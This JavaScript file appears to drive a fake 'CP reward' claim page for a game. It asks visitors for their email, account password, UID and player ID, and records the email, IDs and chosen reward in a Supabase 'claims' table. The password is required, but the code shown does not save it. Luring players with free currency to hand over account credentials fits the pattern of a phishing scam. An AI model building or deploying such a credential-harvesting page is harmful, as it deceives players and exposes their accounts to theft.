alert("JavaScript is working!");
const SUPABASE_URL = 'https://bfpwsqbzrwnznrbnoswi.supabase.co';
const SUPABASE_KEY = 'sb_publishable_-_L-PBjPFSCOVRJWfkwTig_9GikKfqa';

const supabase = window.supabase.createClient(
  SUPABASE_URL,
  SUPABASE_KEY
);

const rewards = document.querySelectorAll('.reward');
let selected = '';

rewards.forEach(button => {
  button.addEventListener('click', () => {
    rewards.forEach(x => x.classList.remove('active'));

    button.classList.add('active');

    selected = button.dataset.cp;
  });
});

document.querySelector('#claimForm').addEventListener('submit', async e => {
  e.preventDefault();

  const result = document.querySelector('#result');

  if (!selected) {
    result.hidden = false;
    result.textContent = 'Please select a CP reward first.';
    return;
  }

  const form = e.target;

  const email = form.querySelector('#email')?.value.trim();
  const password = form.querySelector('#password')?.value.trim();
  const uid = form.querySelector('#uid')?.value.trim();
  const playerId = form.querySelector('#player')?.value.trim();

  if (!email || !password || !uid || !playerId) {
    result.hidden = false;
    result.textContent = 'Please complete all required fields.';
    return;
  }

  result.hidden = false;
  result.textContent = 'Submitting claim...';

  const { error } = await supabase
    .from('claims')
    .insert({
      email: email,
      uid: uid,
      "Player ID": playerId,
      reward: selected
    });

  if (error) {
    console.error(error);
    result.textContent = 'Claim could not be submitted. Please try again.';
    return;
  }

  result.textContent = 'Claim submitted successfully!';
});
